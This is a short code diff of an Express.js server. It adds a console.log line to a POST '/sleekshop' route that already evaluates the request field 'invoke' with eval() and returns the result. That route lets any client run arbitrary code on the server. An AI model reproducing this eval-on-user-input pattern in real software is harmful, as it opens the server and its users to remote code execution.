@@ -31,6 +31,7 @@ app.get('*', (req, res) => {
 });
 
 app.post("/sleekshop", async (req, res) => {
+  console.log(req.body.invoke);
   const data = await eval(req.body.invoke);
   res.json(data);
 });
